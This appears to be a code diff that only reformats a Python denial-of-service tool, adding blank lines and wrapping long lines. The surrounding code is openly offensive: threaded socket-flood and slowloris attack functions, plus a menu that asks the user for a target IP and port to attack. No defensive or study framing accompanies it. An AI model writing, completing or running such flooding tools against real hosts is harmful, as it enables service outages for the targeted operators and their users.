@@ -2,6 +2,7 @@ import socket
 import threading
 from slowloris import slowloris_attack
 
+
 def perform_ddos_attack(target_ip, target_port, num_threads=10):
     def attack():
         while True:
@@ -20,11 +21,26 @@ def perform_ddos_attack(target_ip, target_port, num_threads=10):
 
     print("\nDDoS attack complete.")
 
-def slowloris_ddos(host, port, num_connections=100, https=False, proxy=False, sleep_time=5):
+
+def slowloris_ddos(
+    host, port, num_connections=100, https=False, proxy=False, sleep_time=5
+):
     if 0.1 <= sleep_time <= 10:
-        slowloris_attack(host, port, num_connections, True, https, proxy, None, None, False, sleep_time)
+        slowloris_attack(
+            host,
+            port,
+            num_connections,
+            True,
+            https,
+            proxy,
+            None,
+            None,
+            False,
+            sleep_time,
+        )
     else:
         print("Invalid sleep time. Please enter a value between 0.1 and 10 seconds.")
+
 
 def perform_ddos_attack_wrapper():
     print("Choose DDoS method:")
@@ -42,6 +58,7 @@ def perform_ddos_attack_wrapper():
         target_ip = input("Enter target IP address for Normal DDoS: ")
         target_port = int(input("Enter target port for Normal DDoS: "))
         perform_ddos_attack(target_ip, target_port, 100)
+
 
 # Example Usage:
 # perform_ddos_attack_wrapper()
